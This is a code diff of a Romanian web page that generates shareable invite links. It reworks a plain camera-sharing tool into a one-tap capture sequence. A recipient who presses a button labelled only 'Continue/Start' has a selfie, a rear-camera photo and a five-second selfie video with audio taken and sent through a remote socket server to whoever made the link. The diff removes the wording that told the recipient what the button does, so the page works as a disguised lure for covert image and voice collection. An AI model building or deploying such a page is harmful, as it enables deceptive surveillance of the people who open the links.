@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Link Cameră Live</title>
+  <title>Secvență Cameră Live</title>
   <style>
     * { box-sizing: border-box; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      max-width: 900px;
+      max-width: 920px;
       margin: 0 auto;
       padding: 20px 16px;
       background: #0f1115;
@@ -21,7 +21,9 @@
       padding: 18px;
       margin-bottom: 16px;
     }
-    h2 { margin: 0 0 12px 0; font-size: 20px; }
+    h2, h3 { margin: 0 0 12px 0; }
+    h2 { font-size: 20px; }
+    h3 { font-size: 16px; color: #e5e7eb; }
     .row {
       display: flex;
       gap: 10px;
@@ -55,7 +57,7 @@
       font-size: 16px;
     }
     .btn-gray { background: #374151; color: #fff; }
-    #statusHost, #statusPhone {
+    .statusBox {
       margin-top: 12px;
       padding: 10px 12px;
       border-radius: 8px;
@@ -64,21 +66,39 @@
       color: #d1d5db;
       font-size: 14px;
     }
-    video {
+    video, img {
       width: 100%;
-      max-height: 75vh;
+      max-height: 65vh;
       background: #000;
-      border-radius: 14px;
+      border-radius: 12px;
       border: 1px solid #2a2f3a;
       display: block;
+    }
+    .grid2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 12px;
+      margin-top: 14px;
+    }
+    .mediaItem {
+      background: #0f1115;
+      border: 1px solid #2a2f3a;
+      border-radius: 10px;
+      padding: 10px;
+    }
+    .mediaItem p {
+      margin: 0 0 8px 0;
+      font-size: 13px;
+      color: #9ca3af;
     }
     .hidden { display: none; }
   </style>
 </head>
 <body>
 
+  <!-- VEDERE VIZIONATOR -->
   <div id="hostPanel" class="card">
-    <h2>Vezi camera telefonului</h2>
+    <h2>Recepție flux & capturi</h2>
     <div class="row">
       <button id="createLinkBtn" class="btn-blue" type="button">Generează link nou</button>
       <button id="copyBtn" class="btn-gray" type="button">Copiază link</button>
@@ -86,23 +106,59 @@
     <div class="row">
       <input id="linkBox" type="text" readonly />
     </div>
-    <div id="statusHost">Se conectează la server...</div>
+    <div id="statusHost" class="statusBox">Se conectează la server...</div>
+
+    <div class="grid2">
+      <div class="mediaItem">
+        <p>Selfie capturat</p>
+        <img id="hostSelfieImg" alt="Selfie" />
+      </div>
+      <div class="mediaItem">
+        <p>Poză camera spate</p>
+        <img id="hostBackImg" alt="Camera spate" />
+      </div>
+    </div>
+
+    <div class="mediaItem" style="margin-top:12px;">
+      <p>Înregistrare selfie / Flux live</p>
+      <video id="remoteVideo" autoplay playsinline controls muted></video>
+    </div>
   </div>
 
+  <!-- VEDERE TELEFON -->
   <div id="phonePanel" class="card hidden">
-    <h2>Pornește camera</h2>
+    <h2>Continuă</h2>
     <p style="color:#9ca3af; margin-top:0; font-size:14px;">
       Apasă butonul de mai jos și acordă permisiunea pentru cameră.
     </p>
-    <button id="sharePhoneBtn" class="btn-green" type="button">Pornește camera</button>
-    <div id="statusPhone">Gata de pornire.</div>
-  </div>
+    <button id="startSequenceBtn" class="btn-green" type="button">Pornește</button>
+    <div id="statusPhone" class="statusBox">Gata de pornire.</div>
 
-  <video id="remoteVideo" autoplay playsinline controls muted></video>
+    <video id="phonePreviewVideo" autoplay playsinline muted class="hidden" style="margin-top:12px;"></video>
+
+    <div class="grid2">
+      <div class="mediaItem">
+        <p>Selfie</p>
+        <img id="phoneSelfieImg" alt="Selfie local" />
+      </div>
+      <div class="mediaItem">
+        <p>Camera spate</p>
+        <img id="phoneBackImg" alt="Spate local" />
+      </div>
+    </div>
+
+    <div class="mediaItem" style="margin-top:12px;">
+      <p>Înregistrare selfie (5s)</p>
+      <video id="phoneRecordedVideo" playsinline controls class="hidden"></video>
+      <a id="downloadRecLink" class="hidden" download="selfie-inregistrare.webm" style="display:inline-block; margin-top:8px; color:#60a5fa; font-size:14px;">Descarcă înregistrarea</a>
+    </div>
+  </div>
 
   <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <script>
     const SIGNALING_SERVER_URL = "https://filip-sait.onrender.com";
+    const RECORD_DURATION_MS = 5000; // 5 secunde înregistrare selfie
+
     const socket = io(SIGNALING_SERVER_URL, { transports: ["websocket", "polling"] });
 
     const params = new URLSearchParams(window.location.search);
@@ -114,10 +170,19 @@
     const createLinkBtn = document.getElementById("createLinkBtn");
     const copyBtn = document.getElementById("copyBtn");
     const linkBox = document.getElementById("linkBox");
-    const sharePhoneBtn = document.getElementById("sharePhoneBtn");
+    const startSequenceBtn = document.getElementById("startSequenceBtn");
     const statusHost = document.getElementById("statusHost");
     const statusPhone = document.getElementById("statusPhone");
-    const videoEl = document.getElementById("remoteVideo");
+
+    const phonePreviewVideo = document.getElementById("phonePreviewVideo");
+    const phoneSelfieImg = document.getElementById("phoneSelfieImg");
+    const phoneBackImg = document.getElementById("phoneBackImg");
+    const phoneRecordedVideo = document.getElementById("phoneRecordedVideo");
+    const downloadRecLink = document.getElementById("downloadRecLink");
+
+    const hostSelfieImg = document.getElementById("hostSelfieImg");
+    const hostBackImg = document.getElementById("hostBackImg");
+    const remoteVideo = document.getElementById("remoteVideo");
 
     const rtcConfig = {
       iceServers: [
@@ -127,11 +192,20 @@
     };
 
     let currentRoom = roomFromUrl || ("s-" + Math.random().toString(36).substring(2, 8));
-    let localStream = null;
+    let activeStream = null;
     const peers = new Map();
 
     function setMsg(el, text) {
       el.textContent = text;
+    }
+
+    function sleep(ms) {
+      return new Promise((resolve) => setTimeout(resolve, ms));
+    }
+
+    function stopStream(stream) {
+      if (!stream) return;
+      stream.getTracks().forEach((track) => track.stop());
     }
 
     function buildInviteUrl(room) {
@@ -140,13 +214,12 @@
 
     if (isPhoneInvite) {
       hostPanel.classList.add("hidden");
-      videoEl.classList.add("hidden");
       phonePanel.classList.remove("hidden");
     } else {
       linkBox.value = buildInviteUrl(currentRoom);
       socket.on("connect", () => {
         socket.emit("join-room", { roomId: currentRoom, role: "viewer" });
-        setMsg(statusHost, "Conectat la server. Camera: " + currentRoom + ". Așteaptă fluxul.");
+        setMsg(statusHost, "Conectat la server. Camera: " + currentRoom + ". Așteaptă activarea.");
       });
     }
 
@@ -158,7 +231,9 @@
     createLinkBtn.addEventListener("click", () => {
       currentRoom = "s-" + Math.random().toString(36).substring(2, 8);
       linkBox.value = buildInviteUrl(currentRoom);
-      videoEl.srcObject = null;
+      remoteVideo.srcObject = null;
+      hostSelfieImg.removeAttribute("src");
+      hostBackImg.removeAttribute("src");
       socket.emit("join-room", { roomId: currentRoom, role: "viewer" });
       setMsg(statusHost, "Link nou creat. Copiază-l și trimite-l.");
     });
@@ -174,18 +249,94 @@
       }
     });
 
+    async function openCamera(facingMode) {
+      return await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: { ideal: facingMode },
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: facingMode === "user"
+      });
+    }
+
+    function capturePhotoFromVideo(videoElement, mirror = false) {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoElement.videoWidth || 640;
+      canvas.height = videoElement.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
+
+      if (mirror) {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+      }
+
+      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL("image/jpeg", 0.85);
+    }
+
+    function pickSupportedMimeType() {
+      const candidates = [
+        "video/webm;codecs=vp9,opus",
+        "video/webm;codecs=vp8,opus",
+        "video/webm",
+        "video/mp4"
+      ];
+      for (const mime of candidates) {
+        if (window.MediaRecorder && MediaRecorder.isTypeSupported(mime)) {
+          return mime;
+        }
+      }
+      return "";
+    }
+
+    function recordStreamForDuration(stream, durationMs) {
+      return new Promise((resolve, reject) => {
+        if (!window.MediaRecorder) {
+          reject(new Error("MediaRecorder nu este suportat în acest browser."));
+          return;
+        }
+
+        const mimeType = pickSupportedMimeType();
+        const recorder = mimeType
+          ? new MediaRecorder(stream, { mimeType })
+          : new MediaRecorder(stream);
+
+        const chunks = [];
+        recorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onerror = (e) => {
+          reject(e.error || new Error("Eroare la înregistrare."));
+        };
+
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: recorder.mimeType || "video/webm" });
+          resolve(blob);
+        };
+
+        recorder.start();
+        setTimeout(() => {
+          if (recorder.state !== "inactive") {
+            recorder.stop();
+          }
+        }, durationMs);
+      });
+    }
+
     function createPeerConnection(remoteId) {
       const pc = new RTCPeerConnection(rtcConfig);
       peers.set(remoteId, pc);
 
-      if (localStream) {
-        localStream.getTracks().forEach((track) => pc.addTrack(track, localStream));
+      if (activeStream) {
+        activeStream.getTracks().forEach((track) => pc.addTrack(track, activeStream));
       }
 
       pc.ontrack = (event) => {
-        videoEl.srcObject = event.streams[0];
-        videoEl.play().catch(() => {});
-        setMsg(statusHost, "Primești fluxul camerei live.");
+        remoteVideo.srcObject = event.streams[0];
+        remoteVideo.play().catch(() => {});
+        setMsg(statusHost, "Primești fluxul video live.");
       };
 
       pc.oniceconnectionstatechange = () => {
@@ -201,41 +352,125 @@
       return pc;
     }
 
-    sharePhoneBtn.addEventListener("click", async () => {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        setMsg(statusPhone, "Browserul nu permite accesul la cameră pe acest link/dispozitiv.");
-        return;
-      }
-
-      try {
-        localStream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: { ideal: "environment" },
-            frameRate: { ideal: 24, max: 30 }
-          },
-          audio: false
-        });
-
-        socket.emit("join-room", { roomId: currentRoom, role: "sharer" });
-        setMsg(statusPhone, "Camera a pornit. Se trimite către vizionator...");
-
-        localStream.getVideoTracks()[0].addEventListener("ended", () => {
-          setMsg(statusPhone, "Camera a fost oprită.");
-          peers.forEach((pc) => pc.close());
-          peers.clear();
-        });
-      } catch (err) {
-        setMsg(statusPhone, "Nu s-a putut porni camera: " + err.message);
-      }
-    });
-
     async function sendOfferTo(remoteId) {
-      if (!localStream) return;
+      if (!activeStream) return;
       const pc = createPeerConnection(remoteId);
       const offer = await pc.createOffer();
       await pc.setLocalDescription(offer);
       socket.emit("webrtc-offer", { to: remoteId, offer });
     }
+
+    startSequenceBtn.addEventListener("click", async () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        setMsg(statusPhone, "Browserul nu permite accesul la cameră.");
+        return;
+      }
+
+      startSequenceBtn.disabled = true;
+      socket.emit("join-room", { roomId: currentRoom, role: "sharer" });
+
+      try {
+        // 1. SELFIE (camera frontală)
+        setMsg(statusPhone, "Pasul 1/3: Se deschide camera selfie...");
+        let selfieStream = await openCamera("user");
+        phonePreviewVideo.srcObject = selfieStream;
+        phonePreviewVideo.classList.remove("hidden");
+        await phonePreviewVideo.play().catch(() => {});
+        await sleep(700);
+
+        const selfieDataUrl = capturePhotoFromVideo(phonePreviewVideo, true);
+        phoneSelfieImg.src = selfieDataUrl;
+        socket.emit("captured-photo", {
+          roomId: currentRoom,
+          type: "selfie",
+          image: selfieDataUrl
+        });
+
+        stopStream(selfieStream);
+        await sleep(300);
+
+        // 2. POZĂ CU CAMERA DIN SPATE
+        setMsg(statusPhone, "Pasul 2/3: Se face poza cu camera din spate...");
+        let backStream = await openCamera("environment");
+        phonePreviewVideo.srcObject = backStream;
+        await phonePreviewVideo.play().catch(() => {});
+        await sleep(700);
+
+        const backDataUrl = capturePhotoFromVideo(phonePreviewVideo, false);
+        phoneBackImg.src = backDataUrl;
+        socket.emit("captured-photo", {
+          roomId: currentRoom,
+          type: "back",
+          image: backDataUrl
+        });
+
+        stopStream(backStream);
+        await sleep(300);
+
+        // 3. ÎNREGISTRARE VIDEO CU CAMERA DE SELFIE
+        setMsg(statusPhone, "Pasul 3/3: Se înregistrează video cu camera selfie...");
+        let recStream = await openCamera("user");
+        activeStream = recStream;
+        phonePreviewVideo.srcObject = recStream;
+        await phonePreviewVideo.play().catch(() => {});
+
+        // Trimite și fluxul live către peer-ii conectați în cameră
+        for (const [remoteId, pc] of peers.entries()) {
+          recStream.getTracks().forEach((track) => pc.addTrack(track, recStream));
+          const offer = await pc.createOffer();
+          await pc.setLocalDescription(offer);
+          socket.emit("webrtc-offer", { to: remoteId, offer });
+        }
+
+        const videoBlob = await recordStreamForDuration(recStream, RECORD_DURATION_MS);
+        const videoUrl = URL.createObjectURL(videoBlob);
+        phoneRecordedVideo.src = videoUrl;
+        phoneRecordedVideo.classList.remove("hidden");
+
+        const ext = (videoBlob.type || "").includes("mp4") ? "mp4" : "webm";
+        downloadRecLink.href = videoUrl;
+        downloadRecLink.download = `selfie-inregistrare.${ext}`;
+        downloadRecLink.classList.remove("hidden");
+
+        // Trimite și video-ul (base64) către cameră dacă are dimensiune rezonabilă
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          socket.emit("recorded-video", {
+            roomId: currentRoom,
+            videoDataUrl: reader.result
+          });
+        };
+        reader.readAsDataURL(videoBlob);
+
+        stopStream(recStream);
+        activeStream = null;
+        phonePreviewVideo.classList.add("hidden");
+
+        setMsg(statusPhone, "Secvența completă s-a finalizat (selfie, spate, înregistrare selfie).");
+      } catch (err) {
+        setMsg(statusPhone, "Eroare în secvență: " + err.message);
+      } finally {
+        startSequenceBtn.disabled = false;
+      }
+    });
+
+    socket.on("captured-photo", ({ type, image }) => {
+      if (type === "selfie") {
+        hostSelfieImg.src = image;
+        setMsg(statusHost, "A sosit selfie-ul.");
+      } else if (type === "back") {
+        hostBackImg.src = image;
+        setMsg(statusHost, "A sosit poza de pe camera din spate.");
+      }
+    });
+
+    socket.on("recorded-video", ({ videoDataUrl }) => {
+      remoteVideo.srcObject = null;
+      remoteVideo.src = videoDataUrl;
+      remoteVideo.muted = false;
+      remoteVideo.play().catch(() => {});
+      setMsg(statusHost, "A sosit înregistrarea video selfie.");
+    });
 
     socket.on("existing-peers", async ({ ids }) => {
       for (const id of ids) {
